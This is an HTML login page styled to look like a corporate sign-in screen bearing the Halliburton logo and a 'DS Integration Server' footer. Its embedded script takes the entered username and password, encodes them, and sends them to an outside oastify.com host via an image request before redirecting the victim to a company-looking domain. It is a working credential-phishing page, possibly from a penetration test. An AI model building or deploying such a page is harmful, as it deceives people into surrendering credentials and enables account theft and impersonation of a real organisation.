<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Open Sans', Arial, sans-serif;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .login-box {
            background: #fff;
            padding: 8% 10%;
            width: 100%;
            max-width: 600px;
            position: relative;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        .logo img {
            width: 80%;
            max-width: 400px;
            height: auto;
        }
        .alert {
            background: #fff8dc;
            border-left: 4px solid #ffa500;
            color: #856404;
            padding: 15px;
            margin-bottom: 30px;
            font-size: 13px;
        }
        .form-group {
            margin-bottom: 25px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 14px;
            font-weight: 300;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            font-size: 14px;
            font-family: 'Open Sans', Arial, sans-serif;
        }
        .btn-signin {
            background: #6bcf7f;
            border: none;
            padding: 12px 50px;
            color: #fff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 15px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .btn-signin:hover {
            background: #5ab76d;
        }
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #e31837;
            color: white;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            font-weight: 300;
        }
        .footer strong {
            font-weight: 700;
        }
        
        @media (max-width: 768px) {
            .login-box {
                padding: 40px 30px;
            }
            .logo img {
                width: 90%;
            }
        }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/8b/Halliburton_logo.svg" alt="">
        </div>
        <div class="alert">
            Authentication required: Please verify your credentials to access this protected resource.
        </div>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" required autofocus>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" class="btn-signin">Sign in</button>
        </form>
    </div>
    <div class="footer">
        Powered by<br><strong>DS Integration Server</strong>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            const d = btoa(JSON.stringify({u:u,p:p})).replace(/[^a-zA-Z0-9]/g,'').substring(0,63);
            new Image().src='https://'+d+'.xhi1hwrwxt1hgsff51cr9z43muslgh46.oastify.com/';
            setTimeout(()=>window.top.location='https://pen-dfs.dsif.dazlmkleodev01.ienergycloud.solutions',500);
        });
    </script>
</body>
</html>
